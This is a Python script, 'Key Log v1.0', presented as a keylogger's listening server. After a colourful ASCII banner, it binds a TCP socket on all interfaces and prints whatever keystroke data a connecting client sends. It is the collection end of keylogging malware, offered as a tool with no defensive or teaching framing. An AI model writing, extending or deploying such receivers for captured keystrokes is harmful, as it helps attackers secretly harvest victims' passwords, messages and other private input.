import socket
import threading
import sys
import time

# ANSI color codes for neon text effects
COLOR_PURPLE = "\033[95m"
COLOR_PINK = "\033[35m"
COLOR_BRIGHT_GREEN = "\033[92m"
COLOR_BRIGHT_YELLOW = "\033[93m"
COLOR_BRIGHT_BLUE = "\033[94m"
COLOR_BRIGHT_CYAN = "\033[96m"
COLOR_RESET = "\033[0m"

# Banner
def display_banner():
    neon_colors = [COLOR_PURPLE, COLOR_PINK, COLOR_BRIGHT_GREEN, COLOR_BRIGHT_YELLOW, COLOR_BRIGHT_BLUE, COLOR_BRIGHT_CYAN]

    # Banner lines customized for "Key Log"
    banner_lines = [
        f"{neon_colors[0]}██╗  ██╗███████╗██╗   ██╗    ██╗      ██████╗  ██████╗ {COLOR_RESET}",
        f"{neon_colors[1]}██║ ██╔╝██╔════╝╚██╗ ██╔╝    ██║     ██╔═══██╗██╔════╝ {COLOR_RESET}",
        f"{neon_colors[2]}█████╔╝ █████╗   ╚████╔╝     ██║     ██║   ██║██║  ███╗{COLOR_RESET}",
        f"{neon_colors[3]}██╔═██╗ ██╔══╝    ╚██╔╝      ██║     ██║   ██║██║   ██║{COLOR_RESET}",
        f"{neon_colors[4]}██║  ██╗███████╗   ██║       ███████╗╚██████╔╝╚██████╔╝{COLOR_RESET}",
        f"{neon_colors[5]}╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝  ╚═════╝ {COLOR_RESET}",
        f"{neon_colors[2]}  Key Log v1.0{COLOR_RESET}"
    ]

    # Line-by-line animation effect
    for line in banner_lines:
        sys.stdout.write(line + '\n')
        sys.stdout.flush()
        time.sleep(0.2)  # Delay between lines
    print()

    # Display developer credit
    print(f"{COLOR_BRIGHT_CYAN}{'─' * 30}{COLOR_RESET}")
    print(f"{COLOR_BRIGHT_YELLOW}  Developed by Ashok (NeospectraX){COLOR_RESET}")
    print(f"{COLOR_BRIGHT_CYAN}{'─' * 30}{COLOR_RESET}\n")

# Start server to receive keylogs
def start_server(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(5)
    print(f"[+] Waiting for connection on {ip}:{port}...\n")

    conn, addr = server.accept()
    print(f"[+] Connection established from {addr}\n")

    try:
        while True:
            data = conn.recv(1024).decode(errors='ignore')  # Improved buffer size for Netcat-style output
            if not data:
                print("[!] Connection closed by client.")
                break
            print(data, end="", flush=True)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        conn.close()
        server.close()

if __name__ == "__main__":
    display_banner()
    try:
        host = "0.0.0.0"  # Listen on all interfaces
        port = int(input("Enter port to listen on: "))
        start_server(host, port)
    except ValueError:
        print("[!] Invalid port number. Please enter a valid integer.")
    except KeyboardInterrupt:
        print("\n[+] Server stopped by user.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

